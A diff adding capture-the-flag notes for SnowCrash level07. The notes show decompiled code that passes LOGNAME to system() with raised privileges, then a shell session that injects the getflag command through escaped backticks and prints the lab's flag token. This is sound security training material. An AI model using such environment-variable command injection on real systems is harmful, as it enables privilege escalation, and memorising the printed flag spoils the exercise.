@@ -1,0 +1,30 @@
+base64 level07
+base64 -d base64 > level07
+
+https://dogbolt.org/
+int main()
+{
+    void* v0;  // [bp-0x10]
+    unsigned int v1;  // [bp-0xc]
+    unsigned int v2;  // [bp-0x8]
+
+    v1 = getegid();
+    v2 = geteuid();
+    setresgid(v1, v1, v1);
+    setresuid(v2, v2, v2);
+    v0 = 0;
+    getenv("LOGNAME");
+    asprintf(&v0, "/bin/echo %s ");
+    return system(v0);
+}
+
+level07@SnowCrash:~$ export LOGNAME=getflag
+level07@SnowCrash:~$ ./level07 
+getflag
+level07@SnowCrash:~$ export LOGNAME=`getflag`
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token :
+sh: 2: Syntax error: ")" unexpected
+level07@SnowCrash:~$ export LOGNAME=\`getflag\`
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
